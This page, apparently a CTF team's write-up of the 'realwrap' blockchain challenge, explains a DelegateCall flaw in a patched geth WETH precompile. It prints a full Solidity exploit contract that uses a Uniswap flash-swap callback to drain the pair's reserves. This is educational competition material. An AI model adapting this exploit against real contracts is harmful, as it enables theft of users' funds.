@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+    <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>realwrap | Organisers</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="realwrap" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="CTF Team" />
+<meta property="og:description" content="CTF Team" />
+<link rel="canonical" href="https://org.anize.rs/rwctf-2023/blockchain/realwrap.html" />
+<meta property="og:url" content="https://org.anize.rs/rwctf-2023/blockchain/realwrap.html" />
+<meta property="og:site_name" content="Organisers" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="realwrap" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"CTF Team","headline":"realwrap","url":"https://org.anize.rs/rwctf-2023/blockchain/realwrap.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+    <meta property="og:image" content="https://org.anize.rs/assets/images/logo.png" />
+    <meta name="twitter:card" content="summary" />
+    <!-- TODO <meta name="twitter:description" content="" /> -->
+    <meta name="twitter:title" content="Organisers" />
+    <meta name="twitter:site" content="@0rganizers" />
+    <!-- TODO <meta name="twitter:image" content="" /> -->
+
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="theme-color" content="#040d21">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Hack monospace font -->
+    <link rel='stylesheet' href='//cdn.jsdelivr.net/npm/hack-font@3.3.0/build/web/hack.css'>
+    <link rel="stylesheet" href="/assets/css/style.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
+    <link rel="stylesheet" href="/assets/css/highlight.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
+    <link rel="stylesheet" href="/assets/css/light.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
+
+    <!-- legitimize current Mastodon profile via link verification -->
+    <link rel="me" href="https://infosec.exchange/@organizers" />
+
+
+    <script type="text/javascript">
+        function isLightThemeSelected() {
+          return document.cookie.match(/theme=light/i) != null
+        }
+
+        function setThemeFromCookie() {
+            var html = document.getElementsByTagName('html')[0]
+            html.className = isLightThemeSelected() ? 'light-theme' : 'dark-theme'
+            console.log('Loaded cookie: ' + document.cookie)
+        }
+
+        (function() {
+          setThemeFromCookie()
+        })();
+    </script>
+
+    <script type="text/javascript">
+        function getFootnoteContent(linkId) {
+            const fnId = linkId.replace(/^fnref/, 'fn');
+            return document.getElementById(fnId).querySelector("p").innerHTML;
+        }
+
+        function addFootnote(element, content) {
+            const footnote = document.createElement('div');
+            footnote.classList.add('footnote-box');
+            // Also add the footnote number
+            footnote.innerHTML = `<sup>${element.innerText}</sup> ${content}`;
+            footnote.querySelectorAll('a.reversefootnote').forEach((backlink) => {
+                footnote.removeChild(backlink);
+            });
+            element.insertAdjacentElement('afterend', footnote);
+            element.dataset.toggled = '1';
+        }
+
+        function removeFootnote(element) {
+            element.parentElement.removeChild(element.nextSibling);
+            element.dataset.toggled = '0';
+        }
+
+
+        window.addEventListener("load", function() {
+            document.querySelectorAll("a.footnote").forEach((el) => {
+                const sup = el.parentElement;
+                el.addEventListener("click", (event) => {
+                    const isOpen = Number.parseInt(sup.dataset.toggled || '0');
+                    if (!isOpen) {
+                        addFootnote(sup, getFootnoteContent(sup.id));
+                    } else {
+                        removeFootnote(sup);
+                    }
+                    event.preventDefault();
+                });
+            });
+        });
+    </script>
+
+    <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      "HTML-CSS": {
+        fonts: ["Gyre-Pagella"],
+        imageFont: null,
+        undefinedFamily: "'Arial Unicode MS', cmbright"
+      },
+      tex2jax: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']],
+        processEscapes: true
+      }
+    });
+  </script>
+  <script src="https://cdn.jsdelivr.net/npm/mathjax@2/MathJax.js?config=TeX-AMS_HTML"></script>
+  </head>
+  
+  <body> 
+    <header class="page-header-simple" role="banner">
+      
+      <div class="left-links"><a id="header-logo" href="/">Organi{s|z}ers</a></div>
+      <div class="right-links">
+        <a href="/writeups">Writeups</a>
+        <a href="/achievements">Achievements</a>
+      </div>
+    </header>
+
+    <main id="content" class="main-content" role="main">
+      <h2 id="realwrap">realwrap</h2>
+
+<p><strong>Authors</strong>: <a href="https://sam.ninja">sam.ninja</a></p>
+
+<p><strong>Tags</strong>: blockchain</p>
+
+<blockquote>
+  <p>WETH on Ethereum is too cumbersome! I’ll show you what is real Wrapped ETH by utilizing precompiled contract, it works like a charm especially when exchanging ETH in a swap pair. And most important, IT IS VERY SECURE!</p>
+</blockquote>
+
+<p>In this challenge there is a <a href="https://github.com/Uniswap/v2-core/blob/master/contracts/UniswapV2Pair.sol">UniswapV2Pair</a> contract that allows us to swap between “precompiled” WETH and a simple ECR20 token. The goal is to drain the reserve of the Uniswap contract.</p>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">import</span> <span class="s">"./@openzeppelin/contracts/token/ERC20/ERC20.sol"</span><span class="p">;</span>
+<span class="k">import</span> <span class="s">"./@openzeppelin/contracts/token/ERC20/IERC20.sol"</span><span class="p">;</span>
+<span class="k">import</span> <span class="s">"./UniswapV2Pair.sol"</span><span class="p">;</span>
+
+<span class="k">contract</span> <span class="n">SimpleToken</span> <span class="k">is</span> <span class="n">ERC20</span> <span class="p">{</span>
+    <span class="k">constructor</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">_initialSupply</span><span class="p">)</span> <span class="n">ERC20</span><span class="p">(</span><span class="s">"SimpleToken"</span><span class="p">,</span> <span class="s">"SPT"</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">_mint</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">,</span> <span class="n">_initialSupply</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">contract</span> <span class="n">Factory</span> <span class="p">{</span>
+    <span class="kt">address</span> <span class="k">public</span> <span class="k">constant</span> <span class="n">WETH</span> <span class="o">=</span> <span class="mh">0x0000000000000000000000000000000000004eA1</span><span class="p">;</span>
+    <span class="kt">address</span> <span class="k">public</span> <span class="n">uniswapV2Pair</span><span class="p">;</span>
+
+    <span class="k">constructor</span><span class="p">()</span> <span class="k">payable</span> <span class="p">{</span>
+        <span class="nb">require</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">value</span> <span class="o">==</span> <span class="mi">1</span> <span class="kc">ether</span><span class="p">);</span>
+        <span class="kt">address</span> <span class="n">token</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="k">new</span> <span class="n">SimpleToken</span><span class="p">(</span><span class="mi">10</span> <span class="o">**</span> <span class="mi">8</span> <span class="o">*</span> <span class="mi">1</span> <span class="kc">ether</span><span class="p">));</span>
+        <span class="n">uniswapV2Pair</span> <span class="o">=</span> <span class="n">createPair</span><span class="p">(</span><span class="n">WETH</span><span class="p">,</span> <span class="n">token</span><span class="p">);</span>
+        <span class="n">IERC20</span><span class="p">(</span><span class="n">WETH</span><span class="p">).</span><span class="nb">transfer</span><span class="p">(</span><span class="n">uniswapV2Pair</span><span class="p">,</span> <span class="mi">1</span> <span class="kc">ether</span><span class="p">);</span>
+        <span class="n">IERC20</span><span class="p">(</span><span class="n">token</span><span class="p">).</span><span class="nb">transfer</span><span class="p">(</span><span class="n">uniswapV2Pair</span><span class="p">,</span> <span class="mi">100</span> <span class="kc">ether</span><span class="p">);</span>
+        <span class="n">IUniswapV2Pair</span><span class="p">(</span><span class="n">uniswapV2Pair</span><span class="p">).</span><span class="n">mint</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="n">sender</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="c1">// [...]
+</span>
+    <span class="k">function</span> <span class="n">isSolved</span><span class="p">()</span> <span class="k">public</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
+        <span class="p">(</span><span class="kt">uint256</span> <span class="n">reserve0</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">reserve1</span><span class="p">,</span> <span class="p">)</span> <span class="o">=</span> <span class="n">IUniswapV2Pair</span><span class="p">(</span><span class="n">uniswapV2Pair</span><span class="p">)</span>
+            <span class="p">.</span><span class="n">getReserves</span><span class="p">();</span>
+        <span class="k">return</span> <span class="n">reserve0</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">reserve1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>The Uniswap contract itself is not vulnerable but they have patched <code class="language-plaintext highlighter-rouge">geth</code> to implement a WETH contract directly in the EVM. In the patch, they introduced a vulnerability in the implementation of DelegateCall.</p>
+
+<p>If the Uniswap contract calls our contract, we can make a <code class="language-plaintext highlighter-rouge">delegatecall</code> to the WETH contract and the caller passed to the <code class="language-plaintext highlighter-rouge">Run</code> function will be the Uniswap contract that we want to drain.</p>
+
+<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">func</span> <span class="p">(</span><span class="n">evm</span> <span class="o">*</span><span class="n">EVM</span><span class="p">)</span> <span class="n">DelegateCall</span><span class="p">(</span><span class="n">caller</span> <span class="n">ContractRef</span><span class="p">,</span> <span class="n">addr</span> <span class="n">common</span><span class="o">.</span><span class="n">Address</span><span class="p">,</span> <span class="n">input</span> <span class="p">[]</span><span class="kt">byte</span><span class="p">,</span> <span class="n">gas</span> <span class="kt">uint64</span><span class="p">)</span> <span class="p">(</span><span class="n">ret</span> <span class="p">[]</span><span class="kt">byte</span><span class="p">,</span> <span class="n">leftOverGas</span> <span class="kt">uint64</span><span class="p">,</span> <span class="n">err</span> <span class="kt">error</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c">// [...]</span>
+
+	<span class="c">// Initialise a new contract and make initialise the delegate values</span>
+	<span class="n">contract</span> <span class="o">:=</span> <span class="n">NewContract</span><span class="p">(</span><span class="n">caller</span><span class="p">,</span> <span class="n">AccountRef</span><span class="p">(</span><span class="n">caller</span><span class="o">.</span><span class="n">Address</span><span class="p">()),</span> <span class="no">nil</span><span class="p">,</span> <span class="n">gas</span><span class="p">)</span><span class="o">.</span><span class="n">AsDelegate</span><span class="p">()</span>
+	<span class="c">// It is allowed to call precompiles, even via delegatecall</span>
+	<span class="k">if</span> <span class="n">p</span><span class="p">,</span> <span class="n">isPrecompile</span> <span class="o">:=</span> <span class="n">evm</span><span class="o">.</span><span class="n">precompile</span><span class="p">(</span><span class="n">addr</span><span class="p">);</span> <span class="n">isPrecompile</span> <span class="p">{</span>
+		<span class="n">ret</span><span class="p">,</span> <span class="n">gas</span><span class="p">,</span> <span class="n">err</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">Run</span><span class="p">(</span><span class="n">evm</span><span class="p">,</span> <span class="n">contract</span><span class="o">.</span><span class="n">Caller</span><span class="p">(),</span> <span class="n">input</span><span class="p">,</span> <span class="n">gas</span><span class="p">,</span> <span class="n">evm</span><span class="o">.</span><span class="n">interpreter</span><span class="o">.</span><span class="n">readOnly</span><span class="p">)</span>
+	<span class="p">}</span>
+    <span class="c">// [...]</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>UniswapV2 supports <a href="https://docs.uniswap.org/contracts/v2/guides/smart-contract-integration/using-flash-swaps">flash swaps</a> so we can use this to make it call a <code class="language-plaintext highlighter-rouge">uniswapV2Call</code> function in our contract. In this function, we can do a delegatecall to the <code class="language-plaintext highlighter-rouge">WETH.approve</code> to approve our contract to spend all its WETH.</p>
+
+<p>We cannot do the same for the ERC20 token because it is not a precompiled contract but WETH has a function <code class="language-plaintext highlighter-rouge">transferAndCall</code> that allows us to call <code class="language-plaintext highlighter-rouge">token.approve</code> on behalf on the Uniswap contract.</p>
+
+<p>Here is the exploit contract:</p>
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">pragma</span> <span class="n">solidity</span> <span class="o">^</span><span class="mf">0.8</span><span class="p">.</span><span class="mi">17</span><span class="p">;</span>
+
+<span class="k">import</span> <span class="s">"./@openzeppelin/contracts/token/ERC20/IERC20.sol"</span><span class="p">;</span>
+<span class="k">import</span> <span class="s">"./UniswapV2Pair.sol"</span><span class="p">;</span>
+
+<span class="k">contract</span> <span class="n">Exploit</span> <span class="p">{</span>
+    <span class="kt">address</span> <span class="k">public</span> <span class="k">constant</span> <span class="n">WETH</span> <span class="o">=</span> <span class="mh">0x0000000000000000000000000000000000004eA1</span><span class="p">;</span>
+    <span class="n">IERC20</span> <span class="k">public</span> <span class="k">constant</span> <span class="n">WETH_contract</span> <span class="o">=</span> <span class="n">IERC20</span><span class="p">(</span><span class="n">WETH</span><span class="p">);</span>
+    <span class="n">IERC20</span> <span class="n">token</span><span class="p">;</span>
+    <span class="n">UniswapV2Pair</span> <span class="n">uniswap</span><span class="p">;</span>
+
+    <span class="k">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">uniswapV2Pair</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">uniswap</span> <span class="o">=</span> <span class="n">UniswapV2Pair</span><span class="p">(</span><span class="n">uniswapV2Pair</span><span class="p">);</span>
+        <span class="n">token</span> <span class="o">=</span> <span class="n">IERC20</span><span class="p">(</span><span class="n">uniswap</span><span class="p">.</span><span class="n">token1</span><span class="p">());</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="n">exploit</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
+        <span class="c1">// Flash swap to make the contract call our uniswapV2Call function
+</span>        <span class="n">uniswap</span><span class="p">.</span><span class="n">swap</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="s">"1"</span><span class="p">);</span>
+        
+        <span class="c1">// We should now be allowed to spend all the WETH and the tokens
+</span>        <span class="nb">require</span><span class="p">(</span><span class="n">WETH_contract</span><span class="p">.</span><span class="n">allowance</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">uniswap</span><span class="p">),</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">))</span> <span class="o">==</span> <span class="k">type</span><span class="p">(</span><span class="kt">uint256</span><span class="p">).</span><span class="n">max</span><span class="p">,</span> <span class="s">"exploit failed for WETH"</span><span class="p">);</span>
+        <span class="nb">require</span><span class="p">(</span><span class="n">token</span><span class="p">.</span><span class="n">allowance</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">uniswap</span><span class="p">),</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">))</span> <span class="o">==</span> <span class="k">type</span><span class="p">(</span><span class="kt">uint256</span><span class="p">).</span><span class="n">max</span><span class="p">,</span> <span class="s">"exploit failed for Token"</span><span class="p">);</span>
+
+        <span class="c1">// Drain the contract
+</span>        <span class="n">WETH_contract</span><span class="p">.</span><span class="n">transferFrom</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">uniswap</span><span class="p">),</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="n">WETH_contract</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">uniswap</span><span class="p">)));</span>
+        <span class="n">token</span><span class="p">.</span><span class="n">transferFrom</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">uniswap</span><span class="p">),</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="n">token</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">uniswap</span><span class="p">)));</span>
+
+        <span class="c1">// Sync to update the reserve variables
+</span>        <span class="n">uniswap</span><span class="p">.</span><span class="n">sync</span><span class="p">();</span>
+    <span class="p">}</span>
+
+    <span class="k">function</span> <span class="n">uniswapV2Call</span><span class="p">(</span>
+        <span class="kt">address</span> <span class="n">sender</span><span class="p">,</span>
+        <span class="kt">uint256</span> <span class="n">amount0</span><span class="p">,</span>
+        <span class="kt">uint256</span> <span class="n">amount1</span><span class="p">,</span>
+        <span class="kt">bytes</span> <span class="k">calldata</span> <span class="n">data</span>
+    <span class="p">)</span> <span class="k">external</span> <span class="p">{</span>
+        <span class="c1">// Payback the flash swap
+</span>        <span class="n">WETH_contract</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">uniswap</span><span class="p">),</span> <span class="mi">3</span><span class="p">);</span>
+
+        <span class="c1">// Approve our contract to spend all the WETH
+</span>        <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">,</span> <span class="kt">bytes</span> <span class="k">memory</span> <span class="n">data</span><span class="p">)</span> <span class="o">=</span> <span class="n">WETH</span><span class="p">.</span><span class="nb">delegatecall</span><span class="p">(</span><span class="n">abi</span><span class="p">.</span><span class="n">encodeWithSignature</span><span class="p">(</span><span class="s">"approve(address,uint256)"</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="k">type</span><span class="p">(</span><span class="kt">uint256</span><span class="p">).</span><span class="n">max</span><span class="p">));</span>
+
+        <span class="c1">// Approve our contract to spend all the tokens
+</span>        <span class="n">WETH</span><span class="p">.</span><span class="nb">delegatecall</span><span class="p">(</span><span class="n">abi</span><span class="p">.</span><span class="n">encodeWithSignature</span><span class="p">(</span><span class="s">"transferAndCall(address,uint256,bytes)"</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="n">token</span><span class="p">),</span> <span class="mi">1</span><span class="p">,</span> <span class="n">abi</span><span class="p">.</span><span class="n">encodeWithSignature</span><span class="p">(</span><span class="s">"approve(address,uint256)"</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="k">type</span><span class="p">(</span><span class="kt">uint256</span><span class="p">).</span><span class="n">max</span><span class="p">)));</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+
+
+
+
+<!--       <footer class="site-footer">
+        <a href="https://twitter.com/0rganizers">Twitter</a> | <a id="changeTheme" class="btn-toggle">Dark-Mode</a>
+      </footer> -->
+
+      <div class="lever-meme">
+        <div id="lever" class="lever-off"></div>
+      </div>
+
+      <div class="twitter">
+        <a href="https://twitter.com/0rganizers"><img src="/assets/images/twitter.svg"></a>
+      </div>
+
+      <script>
+        let leverCount = 0;
+        let manic = false;
+
+        function resetLever() {
+            leverCount = 0;
+            setTimeout(resetLever, 1750);
+        }
+
+        resetLever();
+
+        document.getElementById('lever')
+        .addEventListener('click', function (event) {
+          if(leverCount > 10){
+            manic = true;
+            document.getElementById("lever").classList.add('lever-manic');
+            document.getElementById("header-logo").classList.add('rainbow');
+          }
+
+          if(!manic){
+            document.getElementById("lever").classList.toggle('lever-on');
+            ++leverCount;
+          }
+        });
+
+
+      </script>
+
+      <script>
+      function updateThemeToggleFooter() {
+        let elem = document.querySelector('#lever');
+        // elem.innerHTML = isLightThemeSelected() ? 'Dark Mode' : 'Light Mode'
+      }
+
+      (function() {
+        updateThemeToggleFooter()
+      })();
+
+      function togglePageContentLightDark() {
+          var html = document.getElementsByTagName('html')[0]
+          var currentClass = html.className
+          var newClass = html.className == 'dark-theme' ? 'light-theme' : 'dark-theme'
+          html.className = newClass
+
+          document.cookie = 'theme=' + (newClass == 'light-theme' ? 'light' : 'dark') + '; SameSite=Strict; path=/; expires=Fri, 31 Dec 9999 23:59:59 GMT'
+          console.log('Cookies are now: ' + document.cookie)
+
+          updateThemeToggleFooter()
+      }
+
+      const btn = document.querySelector("#lever");
+      btn.addEventListener("click", function() {
+        togglePageContentLightDark();
+      });
+      </script>
+    </main>
+  </body>
+</html>
